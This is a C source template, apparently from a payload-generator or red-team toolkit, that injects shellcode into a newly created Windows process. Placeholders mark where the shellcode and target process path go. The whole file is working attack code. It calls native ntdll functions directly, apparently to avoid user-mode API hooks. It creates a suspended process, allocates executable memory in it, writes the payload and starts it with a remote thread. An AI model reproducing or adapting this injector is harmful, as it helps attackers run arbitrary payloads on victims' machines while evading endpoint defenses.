#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef RTL_USER_PROC_PARAMS_NORMALIZED
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#endif

#ifndef PROCESS_CREATE_FLAGS_SUSPENDED
#define PROCESS_CREATE_FLAGS_SUSPENDED 0x00000001
#endif

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE ProcessHandle;
    HANDLE ThreadHandle;
    CLIENT_ID ClientId;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString) {
        size_t len = wcslen(SourceString);
        DestinationString->Length = (USHORT)(len * sizeof(WCHAR));
        DestinationString->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
        DestinationString->Buffer = (PWSTR)SourceString;
    } else {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
    }
}

int main()
{
    {{shell_code}}

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    typedef NTSTATUS (NTAPI *NtCreateUserProcess_t)(
        PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK,
        POBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES,
        ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS,
        PVOID, PVOID
    );

    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
    );

    typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
        HANDLE, PVOID, PVOID, ULONG, PULONG
    );

    typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE,
        PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
    );

    typedef NTSTATUS (NTAPI *NtResumeThread_t)(
        HANDLE, PULONG
    );

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtCreateUserProcess_t NtCreateUserProcess = (NtCreateUserProcess_t)GetProcAddress(ntdll, "NtCreateUserProcess");
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
    NtResumeThread_t NtResumeThread = (NtResumeThread_t)GetProcAddress(ntdll, "NtResumeThread");
    RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");

    WCHAR imagePath[] = L"{{process_path}}";
    WCHAR commandLine[] = L"{{process_name}}";
    UNICODE_STRING uImagePath, uCommandLine;
    RtlInitUnicodeString(&uImagePath, imagePath);
    RtlInitUnicodeString(&uCommandLine, commandLine);

    RTL_USER_PROCESS_PARAMETERS* processParameters = NULL;
    NTSTATUS rtlStatus = RtlCreateProcessParametersEx(
        &processParameters,
        &uImagePath,
        NULL,
        NULL,
        &uCommandLine,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (!NT_SUCCESS(rtlStatus)) {
        printf("[!] RtlCreateProcessParametersEx failed. NTSTATUS: 0x%08X\n", rtlStatus);
        return 1;
    }

    // Initialiser correctement la structure
    RTL_USER_PROCESS_INFORMATION procInfo = { 0 };
    procInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);

    // Utiliser les bons droits d'accès
    #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
    #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001

    // Appel corrigé de NtCreateUserProcess
    NTSTATUS status = NtCreateUserProcess(
        &pi.hProcess,
        &pi.hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,  // ProcessAttributes
        NULL,  // ThreadAttributes
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES | PROCESS_CREATE_FLAGS_SUSPENDED,
        0,     // ZeroBits
        processParameters,
        &procInfo,
        NULL   // CreateInfo
    );

    if (status != 0) {
        printf("[!] CreateProcess failed. NTSTATUS: 0x%08X\n", status);
        return 1;
    }

    printf("[+] Process created with PID: %lu\n", (DWORD)(ULONG_PTR)procInfo.ClientId.UniqueProcess);

    LPVOID VirtAlloc = NULL;
    SIZE_T size = sizeof(buf);

    status = NtAllocateVirtualMemory(pi.hProcess, &VirtAlloc, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        printf("[!] VirtualAllocEx failed. NTSTATUS: 0x%08X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    status = NtWriteVirtualMemory(pi.hProcess, VirtAlloc, buf, sizeof(buf), NULL);
    if (status != 0) {
        printf("[!] WriteProcessMemory failed. NTSTATUS: 0x%08X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Shellcode written to memory successfully\n");

    HANDLE RemoteThread = NULL;
    status = NtCreateThreadEx(&RemoteThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, (LPTHREAD_START_ROUTINE)VirtAlloc, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        printf("[!] CreateRemoteThread failed. NTSTATUS: 0x%08X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Remote thread created successfully\n");

    NtResumeThread(pi.hThread, NULL);

    CloseHandle(RemoteThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
